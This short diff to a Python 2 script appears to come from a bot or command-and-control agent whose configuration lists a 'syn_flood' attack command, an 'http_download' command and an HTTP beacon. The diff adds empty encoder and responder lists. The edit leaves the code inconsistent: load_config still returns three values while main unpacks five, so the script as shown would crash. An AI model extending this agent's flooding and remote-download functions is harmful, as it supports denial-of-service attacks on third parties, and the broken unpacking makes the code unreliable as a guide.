@@ -35,6 +35,8 @@ def load_config():
     beacons = ['http_get']
     commands = ['syn_flood','http_download']
     decoders = ['json','base64']
+    encoders = []
+    responders = []
     
     return (beacons,commands,decoders)
     
@@ -61,10 +63,10 @@ def start_beacon_loop(controller):
 def main():
     
     print "starting..."
-    beacons, commands, decoders = load_config()
+    beacons, commands, decoders, encoders, responders = load_config()
     
     print "Building controller..."
-    controller = Controller(beacons, commands, decoders)
+    controller = Controller(beacons, commands, decoders, encoders, responders)
     
     print "Starting beaconer..."
     start_beacon_loop(controller)
